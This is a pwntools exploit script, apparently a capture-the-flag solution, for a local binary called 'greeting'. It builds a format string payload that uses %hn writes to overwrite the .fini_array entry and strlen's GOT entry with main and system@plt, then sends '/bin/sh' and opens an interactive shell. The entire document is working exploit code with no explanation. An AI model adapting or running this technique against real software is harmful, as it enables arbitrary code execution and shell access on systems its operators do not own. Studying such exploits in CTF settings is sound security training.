from pwn import *
import struct

binary = context.binary = ELF("./greeting")

if args.GDB:
    p = gdb.debug(binary.path, gdbscript='b *main + 0x2f')
else:
    p = process(binary.path)

finiArray = 0x08049934
strlenGot = 0x08049a54

# get line  = 0x08048614
# systemPlt = 0x08048490

payload = b"UU"
payload += p32(finiArray+2)
payload += p32(strlenGot+2)
payload += p32(strlenGot)
payload += p32(finiArray)

# write 0804
payload += b"%2016x"
payload += b"%12$hn"
payload += b"%13$hn"
# write 8490
payload += b"%31884x"
payload += b"%14$hn"
# write 8614
payload += b"%388x"
payload += b"%15$hn"

with open("payload", "wb") as fp:
    fp.write(payload)

p.sendline(payload)

payload = b"/bin/sh"
with open("payload", "ab") as fp:
    fp.write(payload)

p.sendline(payload)
p.interactive()